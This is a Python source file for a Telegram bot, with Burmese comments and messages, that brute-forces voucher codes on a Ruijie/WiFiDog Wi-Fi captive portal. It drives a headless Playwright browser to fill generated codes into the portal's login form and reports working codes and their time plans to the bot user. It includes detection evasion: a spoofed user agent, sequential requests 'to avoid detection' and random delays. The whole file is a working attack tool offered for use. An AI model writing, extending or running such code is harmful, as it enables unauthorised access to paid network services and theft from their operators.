import asyncio, random, string, re, os, time, uuid, json, base64
from playwright.async_api import async_playwright
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

# ── Global structures ─────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
DEFAULT_NOTIFY = True
last_scan_params = {}
pending_brute = {}
success_messages = {}
limited_messages = {}

_playwright = None
_browser = None
_start_time = time.monotonic()

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── Helper functions ───────────────────────────────────────────────────────
def iter_codes(mode, length):
    if mode == 1: chars = string.digits
    elif mode == 2: chars = string.ascii_lowercase
    elif mode == 3: chars = string.ascii_uppercase
    elif mode == 4: chars = string.ascii_letters
    elif mode == 5: chars = string.ascii_lowercase + string.digits
    else: raise ValueError(f"Invalid mode: {mode}")
    import itertools
    total = len(chars) ** length
    if total <= 5_000_000:
        codes = ["".join(t) for t in itertools.product(chars, repeat=length)]
        random.shuffle(codes)
        yield from codes
    else:
        while True:
            yield "".join(random.choice(chars) for _ in range(length))

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = ["📋 Status: Running", f"⚡ Speed: {speed:,.0f}/min", f"🔍 Checked: {checked:,}", f"💎 Found: {found}"]
    if target: lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Playwright Browser Automation ─────────────────────────────────────────
async def init_browser():
    global _playwright, _browser
    _playwright = await async_playwright().start()
    _browser = await _playwright.chromium.launch(
        headless=True,
        args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    )

async def close_browser():
    global _browser, _playwright
    if _browser:
        await _browser.close()
    if _playwright:
        await _playwright.stop()

async def perform_check_with_playwright(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    """
    Playwright ကို အသုံးပြုပြီး တိုက်ရိုက် browser ထဲမှာ voucher code ကို စစ်ဆေးခြင်း
    """
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return None

    context = None
    page = None
    try:
        # ⭐ Realistic browser context
        context = await _browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080},
            locale='en-US',
            timezone_id='Asia/Yangon',
            permissions=[]
        )
        page = await context.new_page()

        # ⭐ Step 1: Session URL ကို ဖွင့်ပါ (encryption ကို browser က အလိုအလျောက် ကိုင်တွယ်ပါလိမ့်မယ်)
        await page.goto(session_url, wait_until="networkidle", timeout=30000)

        # ⭐ Step 2: "security risks" error ရှိမရှိ စစ်ဆေးပါ
        page_content = await page.content()
        if "security risks" in page_content:
            print(f"[Playwright] ⚠️ Security risk detected for {code}")
            return None

        # ⭐ Step 3: Voucher input field ကို ရှာပါ
        voucher_input = None
        selectors = [
            'input[name="accessCode"]',
            'input[id="accessCode"]',
            'input[placeholder*="code"]',
            'input[placeholder*="voucher"]',
            'input[type="text"]'
        ]
        for sel in selectors:
            try:
                voucher_input = await page.wait_for_selector(sel, timeout=5000)
                if voucher_input:
                    break
            except:
                continue

        if not voucher_input:
            print(f"[Playwright] ❌ Voucher input not found for {code}")
            return None

        # ⭐ Step 4: Code ကို ထည့်ပါ
        await voucher_input.fill(code)

        # ⭐ Step 5: Submit button ကို ရှာပြီး နှိပ်ပါ
        submit_btn = None
        btn_selectors = [
            'button[type="submit"]',
            'button:has-text("Connect")',
            'button:has-text("Login")',
            'button:has-text("Submit")',
            'input[type="submit"]'
        ]
        for sel in btn_selectors:
            try:
                submit_btn = await page.wait_for_selector(sel, timeout=3000)
                if submit_btn:
                    break
            except:
                continue

        if submit_btn:
            await submit_btn.click()
        else:
            await page.keyboard.press("Enter")

        # ⭐ Step 6: Response ကို စောင့်ပါ
        await page.wait_for_timeout(3000)
        response_content = await page.content()

        # ⭐ Step 7: ရလဒ်ကို စစ်ဆေးပါ
        if "logonUrl" in response_content or "success" in response_content.lower():
            # Success ဖြစ်ရင် plan အချက်အလက်ကို ဆွဲထုတ်ပါ
            plan = "N/A"
            try:
                # Balance page ကို သွားပြီး plan ဖတ်ပါ
                await page.goto("https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html", wait_until="networkidle")
                balance_text = await page.inner_text("body")
                # ရိုးရှင်းစွာ စက္ကန့်များကို ရှာပါ
                match = re.search(r'(\d+)\s*(hour|minute|day)', balance_text, re.IGNORECASE)
                if match:
                    plan = f"{match.group(1)} {match.group(2)}"
            except:
                pass

            if not recheck:
                if chat_id not in success_texts:
                    success_texts[chat_id] = []
                success_texts[chat_id].append({"code": code, "plan": plan})

                if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
                    code_line = "\n".join([f"`{item['code']}` – ⏳ {item['plan']}" for item in success_texts[chat_id]])
                    try:
                        if chat_id not in success_messages:
                            sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                            success_messages[chat_id] = sent.message_id
                        else:
                            await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id],
                                                        text=f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                    except:
                        pass
            return code

        elif "STA" in response_content or "limited" in response_content.lower():
            if not recheck:
                if chat_id not in limited_texts:
                    limited_texts[chat_id] = []
                limited_texts[chat_id].append(code)
                if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
                    limited_line = "\n".join(limited_texts[chat_id])
                    try:
                        if chat_id not in limited_messages:
                            sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                            limited_messages[chat_id] = sent.message_id
                        else:
                            await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id],
                                                        text=f"⚠️ Limited Codes:\n{limited_line}")
                    except:
                        pass
            return None

        return None

    except Exception as e:
        print(f"[Playwright] Error for {code}: {e}")
        return None
    finally:
        if page:
            await page.close()
        if context:
            await context.close()

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = None
    checked = 0
    found = 0
    scan_start = time.monotonic()

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
                scan_tasks.pop(chat_id, None)
                return

            batch = [next(code_iter) for _ in range(10)]

            # ⭐ Sequential processing to avoid detection
            for code in batch:
                res = await perform_check_with_playwright(session_url, code, chat_id, scan_id, message=message)
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return
                checked += 1

                # ⭐ Random delay between requests (2-5 seconds)
                await asyncio.sleep(random.uniform(2, 5))

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

    finally:
        scan_tasks.pop(chat_id, None)

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။\n\n🔓 Key approval မလိုပါ။\n🛡️ Playwright Browser Mode")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "🔓 **Key approval မလိုပါ**\n"
        "🛡️ **Playwright Browser Mode** (WiFiDog V2 အတွက်)\n\n"
        "၁။ **Setup**:\n"
        "   /setup <url>\n"
        "   (portal-as သို့မဟုတ် portal-mm-as URL)\n\n"
        "၂။ **ရှာဖွေခြင်း**:\n"
        "   /brute <mode> <length> [target]\n"
        "   Mode:\n"
        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "   ဥပမာ: /brute 1 6 5\n\n"
        "၃။ /status  – အခြေအနေကြည့်\n"
        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
        "၉။ /notify  – Notification ON/OFF\n"
        "၁၀။ /testbalance – Balance စစ်ခြင်း\n\n"
        "⚠️ **သတိပြုရန်**: Browser Mode ဖြစ်သောကြောင့် နှေးကွေးပါမည်။"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    # Playwright ဖြင့် URL ကို စမ်းသပ်စစ်ဆေးပါ
    try:
        context = await _browser.new_context()
        page = await context.new_page()
        await page.goto(url, wait_until="networkidle", timeout=20000)
        await page.close()
        await context.close()
        cid = message.chat.id
        user_data[cid] = {'session_url': url}
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n/brute ဖြင့် စတင်ပါ။")
    except Exception as e:
        await bot.reply_to(message, f"❌ Session URL မှားယွင်းနေပါသည်။\n{str(e)[:100]}")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\n\n"
            "Mode:\n  1 = 0-9\n  2 = a-z\n  3 = A-Z\n  4 = a-zA-Z\n  5 = a-z0-9\n\n"
            "ဥပမာ: /brute 1 6 5")
        return
    try:
        mode = int(args[1])
        length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None
        if mode not in [1,2,3,4,5] or length < 1 or length > 12:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ Mode (1-5) နှင့် Length (1-12) မှန်ကန်စွာထည့်ပါ။")
        return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target}
        await bot.reply_to(message, "ယခင် scan ရပ်ထားသည်။ ပြန်စမလား၊ အသစ်စမလား?", reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message):
    progress_msg = await bot.send_message(chat_id, f"Preparing... Length: {length}\n🛡️ Browser Mode")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, length, chat_id, user_data[chat_id]['session_url'],
                       scan_id, target, message=original_message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done(): data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], message)
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            parts.append(f"`{item['code']}` – ⏳ {item.get('plan', 'N/A')}")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)
    full_text = "\n".join(parts)
    if len(full_text) > 4096:
        for i in range(0, len(full_text), 4096):
            await bot.send_message(chat_id, full_text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    if not (success_texts.get(chat_id) or limited_texts.get(chat_id)):
        await bot.reply_to(message, "ဖျက်ရန် saved code မရှိပါ။")
        return
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    await bot.reply_to(message, "🗑️ Saved codes အားလုံးဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        code = item["code"]
        recode = await perform_check_with_playwright(user_data[chat_id]['session_url'], code, chat_id, recheck=True, message=message)
        if recode: new_success.append(item)
    success_texts[chat_id] = new_success
    if new_success:
        codes_str = "\n".join([i["code"] for i in new_success])
        await bot.reply_to(message, f"✅ Rechecked Codes:\n{codes_str}")
    else:
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 **Bot Status**\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"🛡️ Mode: Playwright Browser\n"
        f"🔓 Key Approval: Disabled"
    )

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    await init_browser()
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await close_browser()

if __name__ == '__main__':
    asyncio.run(main())
